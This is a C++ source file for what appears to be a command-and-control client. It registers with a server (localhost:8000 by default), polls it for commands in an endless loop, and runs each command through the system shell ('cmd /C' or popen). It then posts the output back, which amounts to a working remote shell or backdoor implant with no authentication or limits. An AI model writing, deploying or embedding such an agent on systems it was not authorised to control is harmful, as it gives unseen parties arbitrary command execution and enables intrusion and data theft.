#include <iostream>
#include <string>
#include <cstring>
#ifdef _WIN32
#  include <winsock2.h>
#  include <ws2tcpip.h>
#  include <windows.h>
#  pragma comment(lib, "ws2_32.lib")
#else
#  include <sys/socket.h>
#  include <netdb.h>
#  include <unistd.h>
#  define INVALID_SOCKET -1
#  define SOCKET_ERROR   -1
#endif

std::string host = "localhost";
std::string port = "8000";

#ifdef _WIN32
using socket_t = SOCKET;
#else
using socket_t = int;
#endif

// send the entire buffer to the socket
static bool send_all(socket_t sock, const char* buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
#ifdef _WIN32
        int n = send(sock, buf + sent, (int)(len - sent), 0);
        if (n == SOCKET_ERROR)
            return false;
#else
        ssize_t n = send(sock, buf + sent, len - sent, 0);
        if (n == -1)
            return false;
#endif
        sent += (size_t)n;
    }
    return true;
}

std::string send_request(const addrinfo* res, const std::string& req) {
    socket_t sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock == INVALID_SOCKET) {
        std::cerr << "socket creation failed" << std::endl;
        return "";
    }
    if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
#ifdef _WIN32
        std::cerr << "connect failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
#else
        perror("connect");
        close(sock);
#endif
        return "";
    }
    if (!send_all(sock, req.c_str(), req.size())) {
#ifdef _WIN32
        std::cerr << "send failed: " << WSAGetLastError() << std::endl;
#else
        perror("send");
#endif
    }
    std::string resp;
    char buf[4096];
    size_t content_length = 0;
    bool got_headers = false;
    size_t body_start = 0;
    int n;
    while ((n = recv(sock, buf, sizeof(buf), 0)) > 0) {
        resp.append(buf, buf + n);
        if (!got_headers) {
            size_t pos = resp.find("\r\n\r\n");
            if (pos != std::string::npos) {
                got_headers = true;
                body_start = pos + 4;
                size_t cl = resp.find("Content-Length:");
                if (cl != std::string::npos) {
                    cl += 15;
                    while (cl < resp.size() && resp[cl] == ' ') cl++;
                    size_t end = resp.find("\r\n", cl);
                    if (end != std::string::npos) {
                        content_length = std::stoul(resp.substr(cl, end - cl));
                    }
                }
            }
        }
        if (got_headers && resp.size() - body_start >= content_length)
            break;
    }
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
    if (got_headers)
        return resp.substr(body_start, content_length);
    return resp;
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    std::string client_id = "client_" + std::to_string(GetCurrentProcessId());
#else
    std::string client_id = "client_" + std::to_string(getpid());
#endif
    if (argc > 1) client_id = argv[1];

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }
#endif

    addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    addrinfo* res;
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res) != 0) {
        perror("getaddrinfo");
        return 1;
    }

    std::string body = "{\"client_id\":\"" + client_id + "\"}";
    std::string req = "POST /register HTTP/1.1\r\n";
    req += "Host: " + host + "\r\n";
    req += "Connection: close\r\n";
    req += "Content-Type: application/json\r\n";
    req += "Content-Length: " + std::to_string(body.size()) + "\r\n";
    req += "\r\n";
    req += body;
    send_request(res, req);

    while (true) {
        std::string pollReq = "GET /poll?client_id=" + client_id + " HTTP/1.1\r\n";
        pollReq += "Host: " + host + "\r\n";
        pollReq += "Connection: close\r\n\r\n";
        std::string resp = send_request(res, pollReq);
        auto pos = resp.find("\r\n\r\n");
        std::string bodyResp = pos != std::string::npos ? resp.substr(pos + 4) : resp;
        std::string command;
        auto cpos = bodyResp.find("\"command\"");
        if (cpos != std::string::npos) {
            auto q1 = bodyResp.find('"', cpos + 9);
            if (q1 != std::string::npos) {
                auto q2 = bodyResp.find('"', q1 + 1);
                if (q2 != std::string::npos)
                    command = bodyResp.substr(q1 + 1, q2 - q1 - 1);
            }
        }
        if (!command.empty()) {
            std::cout << "Command: " << command << std::endl;
            std::string result;
#ifdef _WIN32
            std::string fullCmd = "cmd /C " + command + " 2>&1";
            FILE* pipe = _popen(fullCmd.c_str(), "r");
#else
            std::string fullCmd = command + " 2>&1";
            FILE* pipe = popen(fullCmd.c_str(), "r");
#endif
            if (pipe) {
                char buf[1024];
                while (fgets(buf, sizeof(buf), pipe)) {
                    result += buf;
                }
#ifdef _WIN32
                _pclose(pipe);
#else
                pclose(pipe);
#endif
            }
            if (result.empty()) result = "(no output)";
            // escape backslashes and quotes for JSON
            std::string esc;
            for (char ch : result) {
                switch (ch) {
                    case '\\': esc += "\\\\"; break;
                    case '"':  esc += "\\\""; break;
                    case '\n': esc += "\\n"; break;
                    case '\r': break;
                    default:    esc += ch; break;
                }
            }
            std::string resBody = "{\"client_id\":\"" + client_id + "\",\"result\":\"" + esc + "\"}";
            std::string resReq = "POST /result HTTP/1.1\r\n";
            resReq += "Host: " + host + "\r\n";
            resReq += "Connection: close\r\n";
            resReq += "Content-Type: application/json\r\n";
            resReq += "Content-Length: " + std::to_string(resBody.size()) + "\r\n\r\n";
            resReq += resBody;
            send_request(res, resReq);
        } else {
            std::cout << "waiting..." << std::endl;
        }
#ifdef _WIN32
        Sleep(1000);
#else
        sleep(1);
#endif
    }

    freeaddrinfo(res);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}